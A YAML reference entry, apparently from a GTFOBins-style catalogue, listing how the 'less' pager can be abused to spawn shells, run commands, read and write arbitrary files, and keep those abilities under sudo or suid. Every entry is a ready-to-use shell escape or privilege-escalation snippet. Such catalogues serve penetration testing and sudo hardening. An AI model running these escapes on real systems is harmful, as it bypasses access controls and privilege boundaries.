---
functions:
  command:
  - code: |-
      cp /path/to/command ~/.lessfilter
      less /etc/hosts
    contexts:
      unprivileged:
  - code: |-
      LESSOPEN='/path/to/command # %s' less /etc/hosts
    contexts:
      sudo:
      unprivileged:
  file-read:
  - code: |-
      less /path/to/input-file
    contexts:
      sudo:
      suid:
      unprivileged:
  - code: |-
      less /etc/hosts
      :e /path/to/input-file
    comment: |-
      This can be used to read another file, e.g., when invoked as a pager with some fixed content.
    contexts:
      sudo:
      suid:
      unprivileged:
  - code: |-
      LESSOPEN='echo /path/to/input-file # %s' less /etc/hosts
    comment: |-
      This can be used to read another file.
    contexts:
      sudo:
      unprivileged:
  file-write:
  - code: |-
      echo DATA | less
      s/path/to/output-file
      q
    contexts:
      sudo:
      suid:
      unprivileged:
  inherit:
  - code: |-
      less /etc/hosts
      v
    contexts:
      sudo:
      suid:
      unprivileged:
    from: vi
  shell:
  - code: |-
      less /etc/hosts
      !/bin/sh
    contexts:
      sudo:
      suid:
        shell: true
      unprivileged:
  - code: |-
      LESSOPEN="/bin/sh -s 1>&0 2>&0 # %s" less /etc/hosts
      reset
    comment: |-
      The optional `reset` command is needed to receive the echo back of the typed keystrokes.
    contexts:
      sudo:
      unprivileged:
  - code: |-
      VISUAL='/bin/sh -s --' less /etc/hosts
      v
    contexts:
      sudo:
      unprivileged:
...
